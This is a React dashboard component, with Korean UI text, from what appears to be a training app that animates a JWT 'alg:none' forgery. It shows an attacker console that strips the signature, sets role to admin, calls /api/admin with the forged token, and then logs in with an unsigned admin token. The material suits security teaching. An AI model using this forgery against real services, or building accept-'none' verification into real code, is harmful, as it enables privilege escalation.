import { useState } from 'react';
import { Navbar, StatusBadge, Card, TokenDecoder } from '../components/UI';
import { MY_ORDERS } from '../utils/data';
import { createToken, b64url } from '../utils/jwt';

// 공격 단계 (터미널처럼 순서대로 출력)
const STEPS = [
  { cmd: '// 1단계: 현재 토큰 확인',               out: null },
  { cmd: 'localStorage.getItem("token")',          out: 'eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SflKx...' },
  { cmd: '// 2단계: Header 디코딩',                out: null },
  { cmd: 'atob("eyJhbGciOiJIUzI1NiJ9")',          out: '{"alg":"HS256","typ":"JWT"}' },
  { cmd: '// 3단계: alg → none, role → admin 위조', out: null },
  { cmd: 'header = { alg: "none", typ: "JWT" }',  out: '✓ alg 변조 완료' },
  { cmd: 'payload.role = "admin"',                out: '✓ role 변조 완료' },
  { cmd: '// 4단계: 서명 제거 후 토큰 재조합',      out: null },
  { cmd: 'forgedToken = base64(header)+"."+base64(payload)+"."', out: '✓ 위조 토큰 생성 완료 (서명 없음)' },
  { cmd: '// 5단계: 위조 토큰으로 /api/admin 요청', out: null },
  { cmd: 'fetch("/api/admin", { headers: { Authorization: "Bearer "+forgedToken } })', out: '← HTTP 200 OK  🎉 관리자 접근 성공!' },
];

export default function DashboardPage({ session, onLogout, onAttackSuccess }) {
  const [showModal, setShowModal]   = useState(false);
  const [stepIdx, setStepIdx]       = useState(-1);
  const [running, setRunning]       = useState(false);
  const [done, setDone]             = useState(false);

  const startAttack = () => {
    setShowModal(true);
    setStepIdx(-1);
    setDone(false);
    setRunning(true);

    let i = 0;
    const run = () => {
      setStepIdx(i);
      i++;
      if (i < STEPS.length) {
        setTimeout(run, i % 2 === 0 ? 500 : 900);
      } else {
        setRunning(false);
        setDone(true);
      }
    };
    setTimeout(run, 400);
  };

  const goAdmin = () => {
    setShowModal(false);
    const fakePayload = {
      sub: 'user', name: session.name, role: 'admin',
      iat: Math.floor(Date.now()/1000),
      exp: Math.floor(Date.now()/1000)+3600,
    };
    onAttackSuccess({
      token:  createToken(fakePayload, 'none'),
      role:   'admin',
      name:   session.name,
      forged: true,
    });
  };

  return (
    <div style={{ minHeight:'100vh', background:'var(--bg)' }}>
      <Navbar name={session.name} role="user" onLogout={onLogout}/>

      <div style={{ maxWidth:1080, margin:'0 auto', padding:'40px' }}>

        {/* 헤더 */}
        <div style={{ marginBottom:32 }}>
          <h1 style={{ fontFamily:'var(--font-display)', fontWeight:700, fontSize:26, letterSpacing:-0.5, color:'var(--text)' }}>내 주문 현황</h1>
          <p style={{ fontSize:14, color:'var(--muted)', marginTop:4 }}>총 {MY_ORDERS.length}건의 주문이 있습니다</p>
        </div>

        {/* 스탯 */}
        <div style={{ display:'grid', gridTemplateColumns:'repeat(3,1fr)', gap:14, marginBottom:28 }}>
          {[{label:'총 주문 금액',value:'₩312,400',sub:'최근 6개월'},{label:'진행 중',value:'1',sub:'배송 중 1건'},{label:'완료',value:'2',sub:'배송 완료'}].map(({label,value,sub})=>(
            <Card key={label} style={{ padding:'18px 22px' }}>
              <div style={{ fontSize:11, textTransform:'uppercase', letterSpacing:1, color:'var(--muted)', marginBottom:6 }}>{label}</div>
              <div style={{ fontFamily:'var(--font-display)', fontSize:26, fontWeight:700, color:'var(--text)' }}>{value}</div>
              <div style={{ fontSize:12, color:'var(--muted)', marginTop:4 }}>{sub}</div>
            </Card>
          ))}
        </div>

        {/* 주문 목록 */}
        <div style={{ fontFamily:'var(--font-display)', fontWeight:600, fontSize:15, color:'var(--text)', marginBottom:12 }}>📦 내 주문 목록</div>
        <Card style={{ overflow:'hidden', marginBottom:28 }}>
          <div style={{ display:'grid', gridTemplateColumns:'130px 1fr 110px 110px 110px', padding:'12px 20px', borderBottom:'1px solid var(--border)', fontSize:11, textTransform:'uppercase', letterSpacing:1, color:'var(--muted)' }}>
            {['주문 번호','상품명','금액','상태','주문일'].map(h=><div key={h}>{h}</div>)}
          </div>
          {MY_ORDERS.map((o,i)=>(
            <div key={o.id} style={{ display:'grid', gridTemplateColumns:'130px 1fr 110px 110px 110px', padding:'16px 20px', alignItems:'center', borderBottom:i<MY_ORDERS.length-1?'1px solid var(--border)':'none', fontSize:13, color:'var(--text)' }}>
              <div style={{ fontFamily:'var(--font-mono)', fontSize:11, color:'var(--muted)' }}>{o.id}</div>
              <div>{o.product}</div>
              <div>{o.price}</div>
              <div><StatusBadge status={o.status}/></div>
              <div style={{ color:'var(--muted)' }}>{o.date}</div>
            </div>
          ))}
        </Card>

        {/* JWT 디코더 */}
        <Card style={{ padding:22, marginBottom:28 }}>
          <div style={{ fontSize:13, fontWeight:600, color:'var(--warn)', marginBottom:16 }}>🔍 현재 JWT 토큰 분석</div>
          <TokenDecoder token={session.token}/>
        </Card>

        {/* 공격 유도 패널 */}
        <div style={{ background:'var(--danger-lo)', border:'1px solid rgba(255,90,106,.25)', borderRadius:12, padding:'22px 24px', display:'flex', alignItems:'center', gap:16 }}>
          <div style={{ fontSize:36 }}>🔒</div>
          <div style={{ flex:1 }}>
            <div style={{ fontFamily:'var(--font-display)', fontSize:15, fontWeight:600, color:'var(--danger)', marginBottom:4 }}>관리자 페이지 접근 불가</div>
            <div style={{ fontSize:13, color:'var(--muted)' }}>
              현재 토큰의 <code style={{ color:'var(--success)' }}>role: "user"</code> — 관리자 권한 필요
            </div>
          </div>
          <button onClick={startAttack} style={{ padding:'10px 22px', background:'var(--danger-lo)', border:'1px solid rgba(255,90,106,.4)', color:'var(--danger)', borderRadius:8, fontSize:13, fontWeight:600, fontFamily:'var(--font-display)', flexShrink:0 }}>
            ⚡ alg:none 공격 시연
          </button>
        </div>
      </div>

      {/* ── 공격 모달 ── */}
      {showModal && (
        <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,.85)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:1000, padding:24 }}>
          <div style={{ background:'var(--surface)', border:'1px solid var(--border)', borderRadius:14, width:'100%', maxWidth:600, padding:30 }}>

            {/* 모달 헤더 */}
            <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:6 }}>
              <div style={{ width:10, height:10, borderRadius:'50%', background:'var(--danger)', animation: running ? 'pulse 1s infinite' : 'none' }}/>
              <style>{`@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}`}</style>
              <div style={{ fontFamily:'var(--font-display)', fontWeight:700, fontSize:18, color:'var(--danger)' }}>
                ⚡ alg:none 공격 시연
              </div>
            </div>
            <div style={{ fontSize:13, color:'var(--muted)', marginBottom:20 }}>
              서버가 alg 검증을 생략할 때 — 서명 없이 토큰 위조 가능
            </div>

            {/* 터미널 */}
            <div style={{ background:'#050508', border:'1px solid var(--border)', borderRadius:10, padding:'16px 20px', minHeight:280, fontFamily:'var(--font-mono)', fontSize:12, lineHeight:2 }}>
              <div style={{ color:'var(--muted)', marginBottom:8, fontSize:11 }}>// 브라우저 콘솔 — 공격자 시점</div>
              {STEPS.slice(0, stepIdx + 1).map((s, i) => (
                <div key={i}>
                  {/* 커맨드 라인 */}
                  <div style={{ display:'flex', alignItems:'flex-start', gap:8 }}>
                    <span style={{ color:'var(--accent)', flexShrink:0 }}>{'>'}</span>
                    <span style={{ color: s.cmd.startsWith('//') ? 'var(--muted)' : 'var(--text)' }}>{s.cmd}</span>
                  </div>
                  {/* 출력 */}
                  {s.out && (
                    <div style={{
                      color: s.out.includes('성공') ? 'var(--success)' : s.out.includes('✓') ? 'var(--warn)' : 'var(--muted)',
                      paddingLeft:18, fontSize:11,
                    }}>
                      {s.out}
                    </div>
                  )}
                </div>
              ))}
              {/* 커서 */}
              {running && (
                <div style={{ display:'flex', gap:8 }}>
                  <span style={{ color:'var(--accent)' }}>{'>'}</span>
                  <span style={{ display:'inline-block', width:8, height:14, background:'var(--text)', animation:'pulse .8s infinite', marginTop:2 }}/>
                </div>
              )}
            </div>

            {/* 완료 후 버튼 */}
            {done && (
              <div style={{ marginTop:20 }}>
                <div style={{ padding:14, background:'rgba(61,214,140,.1)', border:'1px solid rgba(61,214,140,.25)', borderRadius:8, color:'var(--success)', fontSize:13, fontWeight:600, textAlign:'center', marginBottom:14 }}>
                  🎉 공격 성공 — 서명 없이 관리자 권한 획득
                </div>
                <div style={{ display:'flex', gap:10 }}>
                  <button onClick={()=>setShowModal(false)} style={{ flex:1, padding:'10px 0', background:'transparent', border:'1px solid var(--border)', borderRadius:8, color:'var(--muted)', fontSize:13 }}>
                    닫기
                  </button>
                  <button onClick={goAdmin} style={{ flex:2, padding:'10px 0', background:'var(--danger)', border:'none', borderRadius:8, color:'#fff', fontSize:13, fontWeight:700, fontFamily:'var(--font-display)' }}>
                    관리자 페이지로 침입 →
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
